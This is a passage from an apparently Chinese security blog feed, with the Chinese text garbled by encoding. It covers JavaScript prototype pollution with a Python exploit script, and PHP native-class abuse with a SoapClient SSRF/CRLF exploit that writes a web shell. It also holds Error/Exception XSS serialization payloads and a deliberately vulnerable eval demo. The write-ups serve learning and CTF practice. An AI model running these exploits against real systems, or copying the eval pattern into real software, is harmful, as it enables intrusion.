string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> merge <span class="token operator">=</span> opts<span class="token punctuation">.</span>merge<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> merge <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    merge <span class="token operator">=</span> Object<span class="token punctuation">.</span>assign<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> keys <span class="token operator">=</span> isArray <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token function">split</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> len <span class="token operator">=</span> keys<span class="token punctuation">.</span>length<span class="token punctuation">;</span>  <span class="token keyword">const</span> orig <span class="token operator">=</span> target<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options <span class="token operator">&amp;&amp;</span> keys<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> prop <span class="token operator">=</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    target <span class="token operator">=</span> target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> orig<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">result</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ„é€ <code>NewAttributeKey</code>ä¸º<code>__proto__.extrader</code>ï¼Œ<code>NewAttributeValue</code>ä¸º<code>extrader</code></p><p><code>path</code>è¢«æ‹†åˆ†æˆ<code>[&#39;__proto__&#39;,&#39;extrader&#39;]</code>ï¼Œç¬¬ä¸€æ¬¡çš„forå¾ªç¯ï¼Œå°†<code>target = target[prop]</code>ï¼Œæ­¤æ—¶çš„<code>prop</code>å°±æ˜¯<code>__proto__</code>ï¼Œç»è¿‡ä¸€æ¬¡å¾ªç¯å<code>target</code>å°±ä¸º<code>req.session.knight.__proto__</code>äº†ï¼Œéšå<code>i === len - 1</code>åˆ¤æ–­ä¸ºæœ€åä¸€ä¸ªå€¼ï¼Œè¿›å…¥<code>result</code></p><p>ä¸»è¦çœ‹åˆ°<code>result</code>è¿™ä¸ªæ–¹æ³•ï¼Œä¼šå°†<code>value</code>èµ‹å€¼ç»™<code>target[path]</code>,å­˜åœ¨èµ‹å€¼æ“ä½œ,ä¾¿å‡ºç°äº†åŸå‹é“¾æ±¡æŸ“  </p><p>ä¼ å…¥<code>result</code>å‡½æ•°çš„<code>target</code>ä¸º<code>req.session.knight.__proto__</code>ï¼Œ<code>req.session.knight</code>çš„åŸå‹æ˜¯<code>Object</code>ï¼Œå³<code>Object.prototype</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨<code>Object</code>è¿™ä¸ªç±»ä¸­å®šä¹‰å˜é‡<code>req.session.knight.__proto__[path] = value</code>ï¼Œå³<code>Object.prototype[path] = value</code>ï¼Œé”®ä¸ºpathï¼Œå€¼ä¸ºvalueï¼Œvalueå’Œpathæˆ‘ä»¬éƒ½å¯æ§</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605181626037.png" alt loading="lazy"></p><p>Expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:3000/'</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"NewAttributeKey"</span> <span class="token punctuation">:</span> <span class="token string">"__proto__.extrader"</span><span class="token punctuation">,</span>    <span class="token string">"NewAttributeValue"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">&#125;</span>data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"key"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">&#125;</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'SpawnPoint'</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'Privilege'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'DeveloperControlPanel'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">ç»§æ‰¿ä¸åŸå‹é“¾</a></li><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</a></li><li><a href="https://xz.aliyun.com/t/7182">æµ…æjavascriptåŸå‹é“¾æ±¡æŸ“æ”»å‡»</a></li><li><a href="https://www.huaweicloud.com/articles/588bbccfd343112b66fba197a74dd245.html">JSä¸­çš„prototypeã€__proto__ä¸constructor</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å­¦ç‚¹æ–°ä¸œè¥¿ï¼ŒJavaScriptç‹¬æœ‰çš„å®‰å…¨é—®é¢˜ï¼ŒJavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œè®°ç¬”è®°&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="åŸå‹é“¾" scheme="https://www.extrader.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
    
      <category term="JavaScript" scheme="https://www.extrader.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>phpåŸç”Ÿç±»åˆ©ç”¨</title>
    <link href="https://www.extrader.top/posts/35c0085d/"/>
    <id>https://www.extrader.top/posts/35c0085d/</id>
    <published>2021-05-21T12:00:00.000Z</published>
    <updated>2021-05-21T15:35:44.717Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Class-Found"><a href="#Class-Found" class="headerlink" title="Class Found"></a>Class Found</h3><p><strong>phpä¸­å«é­”æœ¯æ–¹æ³•çš„å†…ç½®ç±»</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è¿”å›ç”±å·²å®šä¹‰ç±»çš„åå­—æ‰€ç»„æˆçš„æ•°ç»„</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è¿”å›ç”±ç±»çš„æ–¹æ³•åç»„æˆçš„æ•°ç»„</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__toString'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__call'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__get'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__isset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__unset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__invoke'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set_state'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><h3 id="SoapClient-call"><a href="#SoapClient-call" class="headerlink" title="SoapClient::__call"></a>SoapClient::__call</h3><p>å¯è¿›è¡ŒSSRF</p><p><strong>range</strong>ï¼š<code>PHP 5, PHP 7, PHP 8</code></p><blockquote><p>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚</p><p>å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œä»…é™äºhttp/httpsåè®®</p><p>SOAPæ¶ˆæ¯åŸºæœ¬ä¸Šæ˜¯ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯çš„å•å‘ä¼ è¾“ï¼Œä½†å®ƒä»¬å¸¸å¸¸ç»“åˆèµ·æ¥æ‰§è¡Œç±»ä¼¼äºè¯·æ±‚ / åº”ç­”çš„æ¨¡å¼ã€‚</p><p>å¦‚æœæƒ³è¦ä½¿ç”¨SoapClientç±»éœ€è¦åœ¨php.inié…ç½®æ–‡ä»¶é‡Œé¢å¼€å¯extension=php_soap.dllé€‰é¡¹</p></blockquote><pre class="language-php" data-language="php"><code class="language-php">SoapClient <span class="token punctuation">&#123;</span>    <span class="token comment">/* æ–¹æ³• */</span>    <span class="token keyword">public</span> <span class="token function">__construct</span> <span class="token punctuation">(</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$wsdl</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token function">__call</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>    <span class="token keyword">public</span> <span class="token function">__doRequest</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$request</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$action</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$version</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$oneWay</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getCookies</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span>    <span class="token keyword">public</span> <span class="token function">__getFunctions</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastRequest</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastRequestHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastResponse</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getLastResponseHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__getTypes</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__setCookie</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">void</span>    <span class="token keyword">public</span> <span class="token function">__setLocation</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">__setSoapHeaders</span> <span class="token punctuation">(</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">__soapCall</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$inputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$outputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span class="token punctuation">&#125;</span></code></pre><p><strong>use</strong></p><ul><li><code>SoapClient::__construct ( string|null $wsdl , array $options = [] )</code><ul><li><code>$wsdl</code>ï¼šwsdlæ–‡ä»¶çš„uriï¼Œå¦‚æœæ˜¯NULLæ„å‘³ç€ä¸ä½¿ç”¨WSDLæ¨¡å¼ã€‚</li><li><code>$options</code>ï¼šå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li></ul></li><li><code>SoapClient::__call ( string $name , array $args ) : mixed</code></li></ul><p>å®˜æ–¹çš„<code>$option</code>å‚æ•°ä¸­æœ‰è¿™æ ·çš„ä¸€æ¡ä»‹ç»</p><pre class="language-none"><code class="language-none">The user_agent option specifies string to use in User-Agent header.</code></pre><p>æˆ‘ä»¬å¯ä»¥è‡ªå·±è®¾ç½®<code>User-Agent</code>çš„å€¼ã€‚å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶User-Agentçš„å€¼æ—¶ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å®Œå…¨å¯ä»¥æ„é€ ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå› ä¸º<code>Content-Type</code>å’Œ<code>Content-Length</code>éƒ½åœ¨<code>User-Agent</code>ä¹‹ä¸‹ï¼Œè€Œæ§åˆ¶è¿™ä¸¤ä¸ªæ˜¯åˆ©ç”¨<code>CRLF</code>å‘é€POSTè¯·æ±‚æœ€å…³é”®çš„åœ°æ–¹ã€‚</p><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span><span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/demo.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span><span class="token operator">=</span> <span class="token string single-quoted-string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?>");'</span><span class="token punctuation">;</span><span class="token variable">$headers</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>   <span class="token string single-quoted-string">'X-Forwarded-For:127.0.0.1'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'Cookie:admin=1'</span>   <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token string single-quoted-string">'wupco^^Content-Type:application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å› ä¸ºUser-agentæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨crlfæ³¨å…¥httpå¤´éƒ¨å‘é€postè¯·æ±‚</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0d%0a'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%26'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è°ƒç”¨__callæ–¹æ³•è§¦å‘ç½‘ç»œè¯·æ±‚å‘é€</span><span class="token variable">$x</span><span class="token operator">-></span><span class="token function">no_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521214101395.png" alt loading="lazy"></p><p>æˆåŠŸå†™shell</p><h3 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h3><p>XSS</p><p><strong>range</strong>ï¼š<code>Error(php7, PHP8), Exception(php5, php7, PHP8)</code></p><p>é€šè¿‡å†…ç½®<code>__toString()</code>é­”æœ¯æ–¹æ³•è§¦å‘ã€‚</p><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><p><strong>Error Class Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">#æ³¨æ„ç‰ˆæœ¬æ˜¯PHP7</span></span></code></pre><p><strong>Payload</strong></p><pre class="language-none"><code class="language-none">O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215011423.png" alt loading="lazy"></p><p><strong>Exception Class Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>ã€€ã€€<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ã€€ã€€<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>Payload</strong></p><pre class="language-none"><code 